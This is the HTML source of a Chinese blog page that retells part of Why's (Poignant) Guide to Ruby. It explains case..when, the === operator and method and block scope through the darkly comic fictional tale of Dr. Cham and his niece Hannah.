  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1895&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1913&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Childhood in Lousville, Winston Co., Mississippi.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在Lousville, Winston Co., Mississippi的童年&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1914&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1919&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Worked at a pecan nursery; punched a Quaker.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在坚果托儿所工作; 殴打了一位贵格会教徒&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1920&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1928&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Sailed in the Brotherhood of River Wisdomming, which journeyed \
     the Mississippi River and engaged in thoughtful self-improvement, \
     where he finished 140 credit hours from their Oarniversity.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在Wisdomming河中航行, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在沿着Mississippi河的航程中, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 他开始思考一些自我完善的问题. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在航行的过程中, 他修完了Oarniversity大学的140学分. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1929&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Returned to Louisville to pen a novel about time-travelling pheasant hunters.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 回到了家乡Louisville, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 开始着笔写作关于能够穿越时间的野鸡猎人&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1930&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1933&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Took up a respectable career insuring pecan nurseries.  Financially stable, he \
     spent time in Brazil and New Mexico, buying up rare paper-shell pecan trees.  Just \
     as his notoriety came to a crescendo: gosh, he tried to buried himself alive.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 找到了一个推销坚果托儿所(? pecan nurseries)保险的&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 还算受尊重的工作. 在经济稳定后, 他跑到巴西和新墨西哥&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 度过了一段时间. 在这段时间里, 他买了一些薄壳坚果树. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 不幸的是, 这段时间也是他的&quot;骂名&quot;到达极点的时候: &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 因为他试着把自己活埋了. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1934&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Went back to writing his novel.  Changed the hunters to insurance tycoons and the \
     pheasants to Quakers.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 重新回去继续着笔写作他的小说. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 将猎人写成了保险业的龙头, 将野鸡写成了贵格会教徒. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1935&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1940&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Took Arthur Cone, the Headmaster of the Brotherhood of River Wisdomming, as a \
     houseguest.  Together for five years, engineering and inventing.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 和Brotherhood of River Wisdomming的校长&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Arthur Cone一起. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 这一个五年他们在一起做了一些工程和发明的事情. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1941&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;And this is where things got interesting.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 现在, 故事开始变得更加有趣了. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意这里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt;关键词, 这可是我们的定义的第一个 &lt;strong&gt;method&lt;/strong&gt;. 
这个简单的函数实际上是一个定义在 &lt;strong&gt;kernel&lt;/strong&gt; 中的函数, 
也就是说这个函数可以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;中的任何一个地方运行. 
让我们来看看如何运行这个函数:&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dr_chams_timeline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1941&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;于是程序就会告诉我们
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;And this is where things got interesting.&quot;&lt;/code&gt;
这个时候就又要提到那个老掉牙的故事了: “好好用你的答案”. 
在这里我用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;陈述的方式来返回一个字符串, 
(这个是因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;方法就是
我们定义的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dr_chams_timeline&lt;/code&gt;方法中最后的一个运行的东西. 
所以最后处理的东西就会被&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;抛出作为返回值. )
这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;的陈述就像是一股涓涓细流从一个判断语句流向另一个判断.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Trickling water spilling down from ledge to ledge.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;让我来帮你把这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;语句搞清楚一点: (哦, 确切来说, 
我应该叫它&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case..when&lt;/code&gt;语句, 这是因为他们没法分开单独地使用. )
首先&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;的关键词后面会跟着一个值, 
然后这个值就会依次和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;when&lt;/code&gt;后面的值进行比较. 
假如遇到一个匹配的值的时候, 这个时候就会返回接下来的语句的值, 
然后将剩下的比较都忽略掉. 
虽然你可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if..elsif&lt;/code&gt;来写&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;代码, 但是这样很麻烦.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;year&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1894&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Born.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1895&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1913&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Childhood in Lousville, Winston Co., Mississippi.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;No information about this year.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的代码就和下面的代码类似:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1894&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;year&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Born.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elsif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1895&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1913&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;year&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Childhood in Lousville, Winston Co., Mississippi.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;No information about this year.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;===&lt;/code&gt;三个等号的比较符有点像是一个松松垮垮的牛仔套索, 
虽然它也会像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;==&lt;/code&gt;一样来检查两个值是否相等, 但是这三等号的比较符, 
相比之下, 没那么严格, 所以它允许一定限度的可变性.&lt;/p&gt;

&lt;p&gt;拿上面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ranges&lt;/code&gt;的作为一个例子吧, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(1895..1913)&lt;/code&gt;实际上和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1905&lt;/code&gt;是不一样的, 
(他们甚至都不是一个类型! )
假如我们想要有两个真正一样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ranges&lt;/code&gt;的话, 咳, 
那就只能是另外一个一模一样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(1895..1913)&lt;/code&gt;. 
但是在上面的例子里面, 
三个等号的比较符会为你在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ranges&lt;/code&gt;里面为你开出一条道路 – 
然后让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1905&lt;/code&gt;这个数字在比较的时候, 就放在一个区间里面进行比较. 
这样的小操作在很多的时候会很便利, 比如就像是我上面的人生大纲一样.&lt;/p&gt;

&lt;p&gt;上面的真的就像是一个人生的大纲一样对吧. 呃, 我是说, 
虽然&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dr_chams_timeline&lt;/code&gt;不过是段代码, 
但是它真的就像是一个人生大纲一样, 简洁又美丽.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/elderly-2.gif&quot; alt=&quot;what research revealed&quot; title=&quot;调查显示了...&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;but-was-he-sick&quot;&gt;But Was He Sick??&lt;/h3&gt;
&lt;p&gt;你要知道, 他一生多舛. 虽然在大众眼中, 他只是一个小说家, 
但是他在炼金术上的造诣颇深: 他曾经用山羊奶和海盐
治好了自己的脚伤; 让一个家伙长回了自己失去的一个拇指; 
发明了一种虽然闻着像是臭脚丫, 但是确实纯天然的夜视药水. 
他还曾经着手制造过一种叫”Liquid Ladder”(液梯)的东西, 
但是因为我才疏学浅, 所以不知道这是什么, 显然这可不只是什么梯子, 
谁知道呢?&lt;/p&gt;

&lt;p&gt;曾经的确有一家报纸采访过Dr. Cham. 然后也确实写了些关于他的文字,
并且在读者反馈中, Dr. Cham得到了4星的好评.&lt;/p&gt;

&lt;p&gt;要知道Dr. N. Harold Cham实际上对他的侄女充满了歉意. 
虽然本来她就身患小儿麻痹症, 即使他没有冒这个险去执行电击疗法, 
她也可能会因为小儿麻痹症而去世.&lt;/p&gt;

&lt;p&gt;所以在1941年的9月9日, 
在自己的秘密手术室中用一罐镇静剂麻倒了他的侄女后, 
他将电极接到了Hannah的鼻子, 舌头, 脚趾头, 还有手肘上. 
在他的助手 – Marvin Holyoake, 一个劣迹斑斑的本科生, 
(a bespeckled undergraduate) 的帮助下, 
他们在她的身上铺上了一层被医生们叫做&lt;em&gt;opus magnum&lt;/em&gt;的薄片状东西. 
然后撒上了一些可以导电的白色金粉 – 这种物质有助于增强导电性, 
然后刺激他的侄女的血液循环. 
(forcing her blood to bloom and fight and vanquish. 
让她的血液爆发性的迸流. )&lt;/p&gt;

&lt;p&gt;但是这是为什么失败了呢? 当电闸被按下的时候, 电压缓缓地升高, 
突然间她弹了起来, 她的脚踢到了电缆线 – 咔咔咔砰!! 
强光冲了出来, 她的头发散落, 死亡的警铃大作, 一股青烟缓缓地升起, 
实验失败了. (接下来的几个星期, 街坊们见面聊的都是: 
“她差一点就没机会了…”)&lt;/p&gt;

&lt;p&gt;对于Hannah, 我写下了如下的代码:&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;opus_magnum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;save_hannah&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opus_magnum&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;每个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;都有自己的一块三分地, 并且进入其中的东西
(变量之类的)是不会受到它周围的东西影响的. 
所以Dr. Cham没法除去他侄女的毛病. 
因为外面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opus_magnum&lt;/code&gt;变量没法突破&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;的铁壁铜墙, 
也就没法进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;的代码块中了.&lt;/p&gt;

&lt;p&gt;假如我们运行这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save_hanhah&lt;/code&gt;方法的话, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;就会大声地抱怨我们(squawk at us), 
然后指出它找不到一个叫&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opus_magnum&lt;/code&gt;的东西.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NameError (undefined local variable or method `opus_magnum’ for main:Object)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我所说的就是 &lt;strong&gt;scope&lt;/strong&gt;. 
显微镜 &lt;strong&gt;micoscopes&lt;/strong&gt; 会把你的视野限制并放大你所见的; 
望远镜 &lt;strong&gt;telescope&lt;/strong&gt; 会极大地扩展你可视的距离. 
在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;中, &lt;strong&gt;scope&lt;/strong&gt; 指的也就是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;block&lt;/code&gt;中一种
“视野”.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我觉得这段比喻很形象, 所以看看原文吧. 
I’m talking about scope. 
Microscopes narrow and magnify your vision. 
Telescopes extend the range of your vision. 
In Ruby, scope refers to a field of vision 
inside methods and blocks.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;想象一下, 当你睁开了眼睛(用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt;开始定义了一个函数, 
或者是打开了一个代码块之类的…), 你所见到的(变量之类的)
就都在你的头脑中投映出来(这些变量就都是有意义的), 
然后当你闭上眼睛之后(用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;end&lt;/code&gt;关上了这个 &lt;strong&gt;scpoe&lt;/strong&gt;), 
这些变量就都消失了. 你可以把数据通过参数(argument)传到里面, 
你也可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return&lt;/code&gt;的方法把数据从方法中送出, 
但是一个在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;中的变量只能够在它自己的&lt;strong&gt;scope&lt;/strong&gt;中使用.&lt;/p&gt;

&lt;p&gt;有一些变量可以有一些更加广泛的 &lt;strong&gt;scope&lt;/strong&gt;. 比如, 
像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$LOAD_PATH&lt;/code&gt;一样的用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&lt;/code&gt;开头命名的全局变量, 
可以在任何一个 &lt;strong&gt;scope&lt;/strong&gt; 中被使用, 访问; 
像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@names&lt;/code&gt;一样的用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;开头的实例变量, 
可以在 &lt;strong&gt;class scope&lt;/strong&gt; 中的任何一个地方访问和使用, 
(就是在类的实例中的任何一个地方都能用); 
像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@tickets&lt;/code&gt;一样的用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;开头的类变量, 
可以在(同一个)类(的实例之间)的任何一个地方使用. 
关于类变量和实例变量的话, 我们可以等一下再详细地介绍一下.&lt;/p&gt;

&lt;p&gt;代码块(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;block&lt;/code&gt;)也有 &lt;strong&gt;scope&lt;/strong&gt;, 但是这却有一点点的模糊, 
也可以有一些可以”通融”的地方.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rescued'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sedated'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sprinkled'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'electrocuted'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Dr. Cham &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; his niece Hannah.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Finally, Dr. Cham &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; his niece Hannah.&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的代码块对博士的每个行动(这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;array&lt;/code&gt;中的每个元素)进行循环, 
(iterates, spins, cycles), 在每一次的循环中, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verb&lt;/code&gt;变量的值都会发生变化, 分别是: “sedated”, “sprinkled”,
“electrocuted”. (安抚, 撒上金属薄片, 通电)&lt;/p&gt;

&lt;p&gt;所以现在问题来了, 当这个代码块运行完毕之后, 他是否解救了他的侄女?&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dr. Cham sedated his niece Hannah.
Dr. Cham sprinkled his niece Hannah.
Dr. Cham electrocuted his niece Hannah.
Finally, Dr. Cham rescued his niece Hannah.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;代码块可以访问在它周围的变量. 但是在上面的代码中, 
代码块的每一次循环中都有一个自身的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verb&lt;/code&gt;变量, 
并且在结束代码块的循环后, 在外面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verb&lt;/code&gt;变量仍然保持不变.&lt;/p&gt;

&lt;p&gt;(“代码块可以访问在它周围的变量.”:&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# sum =&amp;gt; 10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;“每一次循环中都有一个自身的变量”&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 12345&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# i =&amp;gt; 1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;)&lt;/p&gt;

&lt;p&gt;下面的代码显示的就是局部变量的特性: 当scope关闭的时候, 
这个变量以及它的值就随之消去了. 
比如说假如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verb&lt;/code&gt;变量在这个代码块前面并没有定义过的话.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sedated'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'powdered'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'electrocuted'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Dr. Cham &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; his niece Hannah.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Yes, Dr. Cham &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; his niece Hannah.&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么如果尝试运行的话, 就会打印出来一条错误信息:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;undefined local variable or method `verb'&lt;/code&gt;. 
啊, 看来里面的变量绝对不会跑到外头去.&lt;/p&gt;

&lt;p&gt;既是是对于像Dr. Cham一样的大科学家, 
失去他的侄女的心情一定不会是轻松的 – 她的裙子才刚刚上过浆, 
漂亮的刺绣还在她的裙子上开花, 但是她只是静静地倒在他的怀里, 
绛紫色的嘴唇失去了生命, 暗红色的血沫在她的嘴角结成了血块… 
在Dr. Cham的日记中, 他这样地写道: “每天晚上, 
我都会被她的闪耀着金色光芒的焦糊的幽魂折磨者我的良心. 
地狱的猎犬和天使们审判之手密密麻麻地向我扑来… “
毫无疑问他的幻觉愈发得严重了.&lt;/p&gt;

